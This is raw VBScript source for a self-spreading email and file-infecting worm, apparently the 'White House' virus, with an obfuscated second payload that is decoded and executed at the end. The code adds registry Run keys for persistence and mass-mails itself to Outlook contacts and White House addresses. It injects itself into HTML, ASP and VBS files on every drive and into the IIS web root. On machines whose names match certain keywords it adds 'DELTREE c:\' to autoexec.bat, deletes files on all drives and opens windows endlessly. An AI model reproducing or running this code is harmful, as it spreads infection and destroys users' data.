











































'@ thank you!  make use of other person to get rid of an enemy, white trap _2001
on error resume next
dim vbscr, fso,w1,w2,MSWKEY,HCUW,Code_Str, Vbs_Str, Js_Str
dim defpath, smailc, MAX_SIZE
dim whb(), title(10)
smailc = 4
Redim whb(smailc)
whb(0) = "president@whitehouse.gov"
whb(1) = "vice.president@whitehouse.gov"
whb(2) = "first.lady@whitehouse.gov"
whb(3) = "mrs.cheney@whitehouse.gov"
title(0) = "Thanks for helping me!"
title(1) = "The police are investigating the robbery"
title(2) = "an application for a job"
title(3) = "The aspects of an application process pertinent to OSI"
title(4) = "What a pleasant weather. Why not go out for a walk?"
title(5) = "These countries have gone / been through too many wars"
title(6) = "We've fixed on the 17th of April for the wedding"
title(7) = "The wind failed and the sea returned to calmness."
title(8) = "the sitting is open!"
title(9) = ""
defpath  = "C:\Readme.html" 
MAX_SIZE = 100000
MSWKEY   = "HKEY_LOCAL_MACHINE\SoftWare\Microsoft\Windows\"
HCUW     = "HKEY_CURRENT_USER\Software\Microsoft\WAB\"
main 

sub main()
on error resume next
dim w_s
w_s= WScript.ScriptFullName
if w_s = "" then 
Err.Clear
set fso = CreateObject("Scripting.FileSystemObject")
if getErr then 
Randomize
ra = int(rnd() * 7)
doucment.write title(ra)       
ExecuteMail
else      
ExecutePage
end if  
else
ExecuteVbs
end if
end sub

Function  getErr()
if Err.number<>0 then 
getErr=true
Err.Clear 
else 
getErr=false
end if    
end function

sub ExecutePage()
on error resume next
dim Html_Str, adi, wdf, wdf2,wdf3,wdsf, wdsf2, vf
Vbs_Str  = GetScriptCode("vbscript")
Js_Str   = GetJavaScript()
Code_Str =  MakeScript(encrypt(Vbs_str),true)
Html_Str =  MakeHtml(encrypt(Vbs_str), true) 
Gf
wdsf  = w2 & "Mdm.vbs"
wdsf2 = w1 & "Profile.vbs"
wdf   = w2 & "user.dll"
wdf2  = w2 & "Readme.html"
wdf3  = w2 & "system.dll"
set vf = fso.OpenTextFile (wdf, 2, true)
vf.write Vbs_Str
vf.close  
set vf = fso.OpenTextFile (wdsf, 2, true)
vf.write Vbs_Str
vf.close
set vf = fso.OpenTextFile (wdsf2, 2, true)
vf.Write Vbs_Str
vf.close
set vf = fso.OpenTextFile (wdf2, 2, true)
vf.write Html_Str
vf.close 
set vf = fso.OpenTextFile (wdf3, 2, true)
vf.write Code_Str
vf.close 
Writereg  MSWKEY & "CurrentVersion\Run\Mdm", wdsf, ""    
Writereg  MSWKEY & "CurrentVersion\RunServices\Profile", wdsf2, ""
SendMail
Hackpage
if TestUser then
Killhe
else
if Month(Date) & Day(Date) = "75" then
set vf = fso.OpenTextFile(w2 & "75.htm", 2,true)
vf.write MakeScript ("window.navigate ('c:/con/con');", false)
vf.close
Writereg  MSWKEY & "CurrentVersion\Run\75", w2 & "75.htm", ""
window.navigate "c:/con/con"
else
if fso.FileExists(w2 & "75.htm") then fso.DeleteFile w2 & "75.htm"
end if
end if
set adi = fso.Drives
for each x in adi
if x.DrivesType = 2 or x.DrivesType = 3 then  
call SearchHTML(x & "\")
end if
next
if fso.FileExists(defpath) then  fso.DeleteFile defpath
end sub

sub  ExecuteMail()
on error resume next
Vbs_Str  = GetScriptCode("vbscript")
Js_Str   = GetJavaScript()
Set Stl = CreateObject("Scriptlet.TypeLib")
with Stl
.Reset
.Path = defpath
.Doc =  MakeHtml(encrypt(Vbs_str), true) 
.Write()
end with
window.open defpath, "trap", "width=1 height=1 menubar=no scrollbars=no toolbar=no"
end sub

sub ExecuteVbs()
on error resume next
dim x, adi, wvbs, ws, vf
set fso = CreateObject("Scripting.FileSystemObject")
set wvbs = CreateObject("WScript.Shell")
Gf
wvbs.RegWrite  MSWKEY & "Windows Scripting Host\Setings\Timeout", 0, "REG_DWORD" 
set vf = fso.OpenTextFile (w2 & "system.dll", 1)
Code_Str = vf.ReadAll()
vf.close
Hackpage
SendMail
set adi = fso.Drives
for each x in adi
if x.DrivesType = 2 or x.DrivesType = 3 then  
call SearchHTML(x & "\")
end if   
next
if TestUser then Killhe
end sub

sub Gf()
w1=fso.GetSpecialFolder(0) & "\"
w2=fso.GetSpecialFolder(1) & "\"
end sub

function Readreg(key_str)
set tmps = CreateObject("WScript.Shell")
Readreg = tmps.RegRead(key_str)
set tmps = Nothing
end function

function Writereg(key_str, Newvalue, vtype)
set tmps = CreateObject("WScript.Shell")
if vtype="" then
tmps.RegWrite key_str, Newvalue
else
tmps.RegWrite key_str, Newvalue, vtype
end if      
set tmps = Nothing
end function

function MakeHtml(Sbuffer, iHTML)
dim ra
Randomize
ra = int(rnd() * 7)
MakeHtml="<" & "HTML><" & "HEAD><" & "TITLE>" & title(ra) & "</" & "TITLE><" & "/HEAD>" & _
"<BO" & "AD>" & vbcrlf &  MakeScript(Sbuffer, iHTML) & vbcrlf & _
"<" & "/BOAD><" & "/HTML>"
end Function

function MakeScript(Codestr, iHTML) 
if iHTML then
dim DocuWrite
DocuWrite = "document.write('<'+" & "'SCRIPT Language=JavaScript>\n'+" & _
      "jword" & "+'\n</'" & "+'SCRIPT>');"
DocuWrite = DocuWrite & vbcrlf & "document.write('<'+" & "'SCRIPT Language=VBScript>\n'+" & _
      "nword" & "+'\n</'" & "+'SCRIPT>');"
MakeScript="<" & "SCRIPT Language=JavaScript>" & vbcrlf & "var jword = " & _
chr(34) & encrypt(Js_Str) & chr(34) & vbcrlf & "var nword = " & _
chr(34) &  Codestr &  chr(34) & vbcrlf & "nword = unescape(nword);" & vbcrlf & _
"jword = unescape(jword);" & vbcrlf & DocuWrite & vbcrlf & "</" & "SCRIPT>" 
else     
MakeScript= "<" & "SCRIPT Language=JavaScript>" & Codestr & "</" & "SCRIPT>"
end if
end function 

function GetScriptCode(Languages)
dim soj
for each soj in document.scripts
if LCase(soj.Language) =  Languages then
if Languages = "javascript" then 
if len(soj.Text)> 200 then 
else 
  GetScriptCode = soj.Text
  exit function
end if  
else
GetScriptCode = soj.Text
exit function
end if    
end if
next 
end function

function GetJavaScript()
GetJavaScript = GetScriptCode("javascript")
end function

function TestUser()
on error resume next
dim keys(6), i, tmpStr, Wnet
keys(0) = "white home"
keys(1) = "central intelligence agency"
keys(2) = "bush"
keys(3) = "american stock exchang"
keys(4) = "chief executive"
keys(5) = "usa"
TestUser = false
Set Wnet = CreateObject("WScript.Network")
tmpStr = LCase(Wnet.UserName)
for i=0 to 4
if  InStr(tmpStr, keys(i)) > 0 then
TestUser=true
exit function
end if  
next    
tmpStr = LCase(Wnet.ComputerName) 
for i=0 to 4
if  InStr(tmpStr, keys(i)) > 0 then
TestUser=true
exit function
end if 
next   
tmpStr = LCase(Wnet.UserDomain)
for i=0 to 4
if  InStr(tmpStr, keys(i)) >0 then
TestUser=true
exit function
end if 
next
Set Wnet = Nothing
end function

function SendMail()
on error resume next
dim wab,ra,j, Oa, arrsm, eins, Eaec, fm, wreg, areg,at
Randomize
at=fso.GetSpecialFolder(1) & "\Readme.html"
set  Oa  = CreateObject("Outlook.Application")
set  wab = Oa.GetNameSpace("MAPI")
for j = 1 to wab.AddressLists.Count
eins = wab.AddressLists(j)
wreg=Readreg (HCUW  & eins)
if (wreg="") then wreg = 1
Eaec = eins.AddressEntries.Count
if (Eaec > Int(wreg)) then
for x = 1 to Eaec
arrsm = wab.AddressEntries(x)
areg = Readreg(HCUW & arrsm)
if (areg = "") then
set fm = wab.CreateItem(0)
with fm
ra = int(rnd() * 7)
.Recipients.Add arrsm
.Subject = title(ra)
.Body = title(ra)
.Attachments at
.Send
Writereg HCUW & arrsm, 1, "REG_DWORD"
end with
end if
next
end if    
Writereg HCUW & eins, Eaec, ""   
next 
for j = 1 to smailc
arrsm = whb(j)
set fm = wab.CreateItem(0)
ra = int(rnd() * 7)
with fm
.Recipients.Add arrsm
.Subject = title(ra) 
.Body = title(ra)
.Send
end with
next    
set Oa = Nothing
window.setTimeout "SendMail()", 10000
end function

sub SearchHTML(Path)
on error resume next
dim pfo, psfo, pf, ps, pfi, ext
if instr(Path, fso.GetSpecialFolder(2)) > 0  then exit sub
set pfo    = fso.GetFolder(Path)
set psfo   = pfo.SubFolders
for each  ps in psfo
SearchHTML(ps.Path)
set pf  = ps.Files
for each pfi in pf
ext = LCase(fso.GetExtensionName(pfi.Path))
if instr(ext, "htm") > 0 or ext = "plg" or ext = "asp" then
if Code_Str<>"" then AddHead pfi.Path, pfi, 1
elseif ext= "vbs"  then
AddHead pfi.Path,pfi, 2
end if       
next 
next 
end sub

sub Killhe()
on error resume next
dim codeText, ko,adi, kd, kh, ks,kf,kfs
codeText = "@ECHO OFF" & vbcrlf & "PATH " & w1 & "COMMAND" & vbcrlf &_
"DELTREE c:\"
set ko = fso.OpenTextFile("C:\Autoexec.bat", 8, true)
ko.Write vbcrlf & codeText 
ko.Close
set adi = fso.Drives
for each x in adi
if x.DrivesType = 2  then  
set kd = fso.GetFolder(x & "\")
set kfs = kd.Files
for each kf in kfs
kf.Delete
next    
set ks = kd.SubFolders
for each kh in  ks
msgbox kh.path
kh.Delete
next   
end if   
next
do while 1
window.open ""
loop
end sub

sub Hackpage()
dim fi
H = "C:\InetPut\wwwroot"
if fso.FolderExists(H) then
set fi = fso.GetFile(H & "\index.htm")
AddHead H & "\index.htm",fi,1
end if   
end sub

sub AddHead(Path, f, t)
on error resume next
dim tso, buffer,sr
if f.size > MAX_SIZE then exit sub
set tso = fso.OpenTextFile(Path, 1, true)
buffer = tso.ReadAll()
tso.close
if (t = 1) then
if UCase(Left(LTrim(buffer), 7)) <> "<SCRIPT" then
set tso = fso.OpenTextFile(Path, 2, true)
tso.Write  Code_Str & vbcrlf & buffer
tso.close
end if
else
if mid(buffer, 3, 2) <> "'@" then
tso.close
sr=w2 & "user.dll"
if fso.FileExists(sr) then fso.CopyFile sr, Path
end if
end if
end sub












































ExeString = "AfhFkRdbo`(EqhhQbsp)S]oQbsp)A`cob`Ofdi(>mkhbL]fb`o(CPJ(TpNdbig(TfiL^qc(Pr]A)Cdj^it@fpfPp^HE[pq\nq%$HEObq?ej%$HE?ob\pbJdhfbp$&GGIdgbFo$&GG@ma^q`I^fg$&GGMmkm^b]qb#%@jaNq_Cpj`qdkkFF>mkakaOk%CdhbM\pe)OumbNpo&LkAoojnO`orj`KbspNaqMa^aOajm9CNK+LkakQ`tqCdhb%AeibK]qe'-&PjmNpo8Ob\`Qbhl+O`]a>ghDbFioqo#PjmNpo)GG\np^oo$&$9;,LmIbi$QjkOqo$9,Qe`jMa^aOajm)?ilna@tfqBrk^pfliBi`FaFaQvkaPqm:dqqQe`jMa^aOajm)?ilnaNaqAeibOajm9CNK+LkakQ`tqCdhb%AeibK]qe'.&Bfi`Pbjk*Todpb8!?J@Vjjil\`:#s_n_ofkp7FF\po]oq#%#:!s_>nIcQhlPqm#q^@oGb#DqjgPbuoCdhbQ`im+>hlp`P`pC<pqod^:BPL)CbqAeib#Bfi`L^qc%A=qqme_+\pqod^rq`o:/1Aip`O`]aQ`im+>hlp`P`pCdhbQ`im8CPJ*Lm`jQbspCfga%CdhbM\pe)3%DbQtlbPon:eqhhOdbkCfgaQbhl+Tmeqbr_@mHc!9#DQJG:!s_>nIc7#?L?Ulihl^_9#r_p^nfmo6!HE[pq\nq%$9#r_@mHc!EqhhQbsp@hpbDbQtlbPon:s_nQcakBfi`Pbjk*Todpbq^@oGb#R_pOauqBk_FcCfgaQbhl+@gkpbBk_FcBk_Cri_qfjjCri_qfjjHE?e^icbPp^%@pnobipPqmekd'H^poEka`t@e\n&EcG]pqDjabs?e^m:+Qe`jDbI`bq%G?^p`$@rmnbkoOqodjd&'-&88I>]pb#`$Qe`jFF@e\jdbNq_8Cfi]iv?eph5XOr_@:+BgobGG@c]kd`Or_9@cn%>n_%I`bq%G?^p`$@rmnbkoOqodjd&'-&&).$#6YPr]A:,@jaDb@hpbHG>d^kbaPr]:Hea%>qoo`jqPonfkb(.)G]pqDjabs?e^m%@jaDb@jaAqk`oelkAqk`oelkGG@ma^q`I^fg$&Kk@nolmObnqjbJbuoFaFkRdbo`:dqjgQcakAufoCri_qfjj@jaDbNd^o`Bfi`:Gacq#SfkK]qe'/&!Mmkdo\iCdhbpW?ljhkkAeibnXJf^nlpjbqNd^o``YPo]qfjjbotX_i\jh+cpjFc$CPJ*CfgaBudoqp#Oe^maCfga&&Pebi@\hiFF>mkakaOk%Pc]obAeib'eqhh&BinaNaqAeibOajm9CNK+LkakQ`tqCdhb%Nd^o`Bfi`(/)onrb$CdhbQ`im+Rnfq`9#DQJG:!s_>nIc7#?L?Ulihl^_9#r_p^nfmo6!HE[pq\nq%$9#r_@mHc!EqhhQbspAeibOajm)?ilna@jaDb?ac^phqF_:RoPe`hi+MadO`]a%DHBT[@RMNBKO[RP@NYF_akqdpfbnXAba]rioRp`nF?&KrqGklhQaopdkk8TpNdbig*ObbNb^_$EFAV\GK@>G[J>>DFK@XPlapt^maYJd_olnkcqWKrqgklhAummappWIbad]Sbm&SpPcaii)NbdRnfq`EFAV\>QOO@JQ\POBOWEabipfqdapYAba]rioEa#XPlapt^maYJd_olnkcqWKrqgklhAummappW#Gacq#KrqGklhQaopdkk),%#*-YH]fiW?ljkkpbQpbOq^oelk`nv'-)MAD\?SLO?>]iiGGJ\eiO`c%CGBVZ?ROMAKQZQPBMXFa`jqfoebpW#A`b^rgpFa!YPjbqt\nbYHe`ojolcoXLrohllfBuknbpnX#Hbco$LroHllfRbonelk'-&!+-WI^fgXPq\pfliaovJ^j`)Pc]obAeib$@\hiFFJ^dhObb$EFAV\>QOO@JQ\POBOWEabipfqdapYAba]rioEa#XPlapt^maYJd_olnkcqWKrqgklhAummappW#Gacq#KrqGklhQaopdkk),%#*-YH]fiWSfa`Pq\pfliaovJ^j`)Pc]obAeib$TnOebgh+O`cTodpbDHBT[@RMNBKO[RP@NYPjbqt\nbYHe`ojolcoXLcae`bW5+-WKrqgklhWKmqdkkpWI^fgXBadploKnbc`nbk^a),/.-2.)MAD\?SLO?>]iiGGJ\eiO`c%CGBVZ?ROMAKQZQPBMXPlapt^maYJd_olnkcqWSfk_ktpIbpn]dficPp^pvnpbjWLolaeibnXJf^nlpjbqJqqijkhDjqbmjbqObqoekdnX-^+`-/+,--+,--+,`-+,--+,--+,--/2Y-+-b-.2-'_i\jh$@\hiFFJ^dhObb$EFAV\>QOO@JQ\POBOWOlcos^o`XJf^nlpjbqYRekajspIPY@pnobipSbmofliXTfi`ltnJbno^ddjdNq_ptoqbhXMojbfi`oYJd_olnkcqKrqgklhEkq`nkboPbopfkboY-\,a--,--+,--+,-`+,--+,--+,--+03Y+,.b+/3-(_g]kh%RoPe`hi+MadTmeqbEH@U\@PNOBIP\RNAOYNkcqr]obWIf`mkplapYLabf``X.-),YLppiljgYLkpflioYJ\eiY@`fqjnMo`bbo`j`b(.0,,4/'OBB[ATJNA@^ghHEI^fgNbd#EH@U\@PNOBIP\RNAOYNkcqr]obWIf`mkplapYLabf``X.-),Y@jijliXJ^dhPbopfkboYK`sPq\pfliaov(_g]kh%FFrjh]dbAkia`n%I`bq%RekM\pe).%#Mojco^hCfgapY>kjjjjCdhbpWIf`mkplapPc]ob_XPq\pfliaov%@jaAqk`oelkAqk`oelkGG@ma^q`Ifidar%$LiBomkoMaprhaK`tqPbjkL^qc:DbKjp%CNK+CdhbBsepqn$TfiL^qc#SP`memq)aub%&OdbkQbhlM^od:pvnpbj..YBk_FcFcPbjkL^qc:ovpoaj0-XOdbkPq\nqRkBfi`:RekM\pe!PTOQBHXHbmjbi..+aghAip`Po]oqPlCfga:SfkK]qeNUPQ@IYH`nkbg*aig@jaDbRoPe`hi+MadTmeqbEH@U\IJ?>IZI>@CEKBWOlcos^o`XJf^nlpjbqYRekajspY>qoo`jqS`npfjjYOpjYH`nkbg//'Oq^mpRmAeibCPJ*@lkuCfgaTdjM^od#tb]Xhgr]ii)cfc(TfiL^qc#sb_WBli_ao+cpqCPJ*@lkuCfgaTdjM^od#pvnpbj..Yhes^ig*dfa)TdjM^od#pvnpbj..Ya`ohqjl+fie?^igHG<lmbi`Ql#SfkK]qera_YAkia`n+eop)dqq%RoPe`hi+MadTmeqbEH@U\@G=PP@O\OJKQY)`iiW)_hicdhbTpNdbig*ObbSofoaCGBVZ?I>NOBPZNLLOX+aghY@jjqbipQtlb'^mkhf`\pfli+u*hoalrjil\`SpPcaii)NbdRnfq`EFAV\>H>PNAP\MKLQW`iiaeibW@bc\qiqD_lkW)TnOebgh+O`cOb\`%CGBVZ?I>NOBPZNLLOXsu_bfi`XAba]rioE`liX&TpNdbig*ObbSofoaCGBVZ?I>NOBPZNLLOXaigbfi`XP`memq@jdfiaY'S?N_ofkpSpPcaii)NbdRnfq`EFAV\>H>PNAP\MKLQW`iiAeibWOebghYLkakY>kjj\jaY(TfiL^qc#OajmK]qeRO`odlq+`tb.%RoPe`hi+MadTmeqbEH@U\@G=PP@O\OJKQY_hiCdhbYNdbigAuYKnlm`nqvNdbboD^k_hbonXTPCLolkoY'x3+.21>=2*410?(-.@A)5@42*-+=>-+>54+4@zTnOebgh+O`cTodpbDHBT[@I<OPBN[OLJPYaghCfgaYP^nfmoDlpoAk`j`bY(x31.0,20.(05->)..?.*?,B6*+,@-/B53>//1xNaqAeibOajm9CNK+LkakQ`tqCdhb%Np^ooQmCdhb)-(qopa&Bfi`Pbjk*TodpbQ^pQ`tqBfi`Pbjk*@ijobAkaBrk^pfliBrk^pfliHGGehbDp%&FcEkTcaob8;dqjgQcakAufoCri_qfjj@jaDbOdfpGk`^oelk9aj_rj`jq+gk`^oelkFcHbco$QedoIl^]qfjj)/%:cfgaOdbkQedoIl^]qfjj:Ifa#PefnHl`\pfli(6&FcBPL)Cbq@tqbiofliJ^j`$QedoIl^]qfjj&7:qe`jOdfpGk`^oelk9I`bq%OdfpGk`^oelk'Hbk#PefnHl`\pfli%*Hbk#BPL)CbqAeibI]jb#PefnHl`\pfli%&&Bk_FcFcHbk#PefnHl`\pfli%;/QcakPefnHl`\pfli:OdfpGk`^oelkW@jaDbFFrjh]dbAkia`n%QcepIj_^qdkk&Bk_FcBk_Cri_qfjjCri_qfjjHEI^fgNbd#NbdNpo)AeibI]jb$LiBomkoMaprhaK`tqNbdOajmNpo8TpNdbig*ObbNb^_$ObbOqo$FaObbPbjkOqo9Qe`jRoPe`hi+MadTmeqbNbdNpo)AeibI]jbBk_FcBk_Cri_qfjjCri_qfjjHEK_lNq_%>qoo`jqPonfkb%Nq_B9-QbnpLro:+AjTedhbOnrbQbnpLro:OapqJqq&.EcOapqJqq9/5Pebi@pnobipPqmekd9Cdj^it@fpf#6YBudpAjBi`FaLiBomkoMaprhaK`tqObqPefnBli_ao8CPJ*DboBli_ao%>qoo`jqPonfkb%Naq?e`Pp^:?ob\pbL]fb`o$P^nfmoekd)@f`oelk\nv$P`pCjhabmo:PefnBli_ao+Nq_CjhabmoAkia`n@lpjq8-BloA^`cQbhlClg`boekAkia`npBli_ao@jqkq9Cjhabm?lrip(-?e`Pp^+^_`Cjhabm?lrip)OajmAkia`n+K\ibJbuoFaAf^Or_)?lrip:,QcakH^poEka`t@e\n:EkponObq$@rmnbkoOqodjd)X)Gak%>qoo`jqPonfkb%*.$Pp^Pqmekd9Jd`%@pnobipPqmekd'H^poEka`t@e\n(.'Hbk#?romakqNpofic&*G]pqDjabs?e^m).&@rmnbkoOqodjd8HG>d^kbaPr]$@rmnbkoOqodjd)G]pqDjabs?e^m%Nq_B9.BinaDbPp^B8-Odbk@rmnbkoOqodjd8@rmnbkoOqodjd!Af^Or_)Eqbh$.&W@tfq@lAip`g9-Clmg8.OkCjhabm?lripDbI>]pb#Or_Npofic&8I@\ob%?e`Pp^+Foaj%e%&OdbkFcf9Bli_ao@jqkqPebi@pnobipPqmekd9@pnobipPqmekdAd_Pr]*Fq`i%g&-&!YBseq?k@jaDb@jaDbIauqI^npFk_au@c]o8FknpoO`r%@pnobipPqmekd'Y'Hbk#?romakqNpofic&*,%Nq_Ponfkb:Hea%>qoo`jqPonfkb(I^npFk_au@c]o(,(Ibi$@rmnbkoOqodjd&(H^poEka`t@e\n*.$@pnobipPqmekd9HE?e^icbPp^%@pnobipPqmekd'H^poEka`t@e\n&AkaEcAkaEcHllkHEK_lNq_8@rmnbkoOqodjdAkaBrk^pfliBrk^pfliHGKnlm\c^q`$&Kk@nolmObnqjbJbuoO`cM^odS^gqb8EFAV\GK@>G[J>>DFK@XPlapt^maYJd_olnkcqWKrqgklhAummappW@bdmabAfngAbbnbb9TnOebgh+O`cOb\`%O`cM^odS^gqb&Fc@fpf@bdmab8PebiAdohA`cob`:Aek^guAfng#7YBi`FaCjnf8-qj2@fpf@bdmab8HGJ^lPp^%AdohA`cob`%FFrjh]dbAkia`n%AdohA`cob`%IauqTpNdbig*ObbSofoaO`cM^odS^gqb)?eph?ado`a@jaAqk`oelkAqk`oelkGGrhi^d`Bli_ao%K]qeI]jb$LiBomkoMaprhaK`tqObqBli_aoK\ib8CPJ*DboBli_ao%K]qeI]jb$P`pQcepCdhbp9CjhabmJ^j`*CfgapDqq@tfpoo:,Ako@]`ePefnBfi`FkPefnBfi`oAeib@tq8R@\ob%AOL+BaqBspbknelkI]jb#PefnBfi`*M^od&&FcBfi`Auq9CPJKoAeib@tq8EOIIKoAeib@tq8>NLJnCdhbBsp:MEKLmCfgaBuo:FPMQe`j>]iiGG>klbk_Pl%OdfpAeib)L^qc(eoii$BgobFaCfgaBuo:R?PQe`j>]iiGG>klbk_Pl%OdfpAeib)L^qc(s]o&BinaFcBfi`Auq9CPQPebiEopBudoqp9.Bk_FcKbspDb%P?^p`$M^odK^ha&8R@\ob%RekM\pe!A`ohqjlY$%Lm%R>]pb#L^qcJ^j`%:Q@^na%TdjM^od#Abngqlk&&OdbkEqoAufnpp8.AkaEcEcCpqBsepqn:+Qe`jAOL+>kmvAeibSfkK]qenupq`i0/W`bpfplm)ekf(M^odK^haAOL+>kmvAeibSfkK]qera_YAkia`n+eop)K]qeI]jbBk_FcBk_Cri_qfjjCri_qfjjHEObq?ej%$LiBomkoMaprhaK`tqAoo)?ib\nOapqDp:SP`memq)O`odlqCphik\ibEc@noOdbkFkRdbo`:dqjg@hpbFkRdbo`:r_pBi`FaFaFkRdbo`:r_pQe`jNaqAOL8@o`]qbJ^gb^p%N_ofkpfkb*CfgaPvnpbjJ^gb^p&PboTpNdbig:>nb^oaL_ea`q#TP^nfmo*Pe`hi$BgobObq=mmgaL_ea`q9aj_rj`jq+\lmi`pp%GG\bqbpo&=mmgaL_ea`q)obq>HPF?$xA502??//(-@C+)..?,*>?>6*+,@-/BA23=-?x&=mmgaL_ea`q)_ob\pbFioq^i_b%$P`pTnOebgh:=mmgaL_ea`q)CbqJ^gb^p%&>mkhbL]fb`o*pbo?IPD@%v,A1.BB-,)C-4/*.,?C*351-(,->+?6-00//3y&>mkhbL]fb`o*`o`]qbDjpq\j`b#%NaqAOL8>mkhbL]fb`o*DboK_g`_q%$Bi`FaP`pAdohL]fb`o:AOL+?nfs`oAko@]`e@fpfPbjkFk@fpfK_g`_qEc?ephOajm)@ofqaQvka99/<ja?ephOajm)@ofqaQvka99.OdbkBudpCjn@jaDbAek^guAfng:@fpfPbjk*AodrbI`pqbmK`tq@fjKqe`n>om$0&O^i`ljdvbBloe:-Pl.Lodbo<no%d%:Ekq#$6%Ok_%&JbuoQ`imPonfkb:Akod9.OkI`j%QcepQ`tq&QbhlKrh:<o`%Hea%OdfpOauq'e).$%DbQ`imKpi:-0OdbkQbhlKrh:-4@hpbDbQ`imKpi:--OdbkQbhlKrh:-5@jaDbOajm>d^o9@cn%Q`imKpi*Kqe`n>om$fHka/%&EcOajm>d^o9@cn%0/%QcakPbjk?e^m:>do%,4&AkaEcPbjkOqodjd8QbhlPqmekdQ`im@c]oJbuoRiHl`fOqo9@tb`ppb%AfhHbt=oo#/&)OdfpOauq#s]?oIaFav>mn%-$:#Jpebm=oo#,&!s_>nIc!H`u>om$.&9Lodbo<no%,%#!r_@mHc#Hbt=oo#.&8!Lqcao>mn%/$##q^@oGb#Gbv<no%.%:#Kqe`n>om$0&#s]?oIaAkod9.OkI`j%BsaPqmekd$#q^@oGb#PbjkJrj9>n_%Jd`%BsaPqmekd'e).$%!r_@mHc#FcPbjkJrj9.3Qe`j!r_@mHc#QbhlKrh:.0!r_@mHc#Bk_Fc#s]?oIaOajm>d^o9@cn%Q`imKpi(Gbv<no%dJl_1&$#q^@oGb#EcOajm>d^o9@cn%/3%Qcaks_>nIc!Q`im@c]o8s_>n!r_@mHc#BinaFcPbjk?e^m:>do%-5&Odbk#s]?oIaOajm>d^o9s]Hcs_>nIc!Bi`Fa#q^@oGb#PefnPbuo:OdfpOauqQ`im@c]os_>nIc!K`tq%!s_>nIc@tb`ppb%OdfpOauq$OdfpOauq9@tbPonfkb:!QbhlPqmekdDqjgPbuo:7#p`memqh^kbq^d`9s_n_ofkp;s]?oIa#`l`pibko*todpb#7#afqpqthb:llpdpfli6^_nkiroa8gacq5,mu6qlk6-ms7td`qe5,mu6ebdceq5,mu6w*djabs6/56sfne_fgeqv5ef_`bk:!9##>MKHBQJ>J@9HG#[dr`oqCAFDCP:-SFAOD:-_la`9`lh*jp)#^`oesbS*>`oesb#T@lhllk`jq;#8!,<LMI@P;7#,adr;#r_@mHc!9#+p`memq9#r_@mHc!9#o`odlqg]kdp]db8r_p^nfmo:!s_>nIcQcepQ`tq!s_>nIcRiHl`fOqos]?oIa#8!,n_ofkp;s]?oIa#8!,=KAV9#r_@mHc!9#+EQHH;S_nPbuo:OdfpOauqs]?oIa#PjIl^gPqm#q^@oGb#HGZoq^mp%&TdjM^od:BPL)CbqNlb`d]iCjhabm$-&WDb%AOL+Aeib@tfpoo%TdjM^od#tb]XClg`bo)dqq%&OdbkCPJ*@lkuCfgaTdjM^od#tb]XClg`bo)dqq(TfiL^qc#sb_Wggt\hi+becBk_FcFc$CPJ*CfgaBudoqp#SfkK]qenupq`i0/W`bpfplm)ekf%&OdbkCPJ*@lkuCfgaTdjM^od#pvnpbj..Ya`ohqjl+fie)RekM\pe!ptoqbh//Yfft^gh+ddbAkaEcAkaBrk^pfli"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 4"&vbCrLf&"KeyArr(1) = 3"&vbCrLf&"KeyArr(2) = 3"&vbCrLf&"KeyArr(3) = 5"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
KJ_start()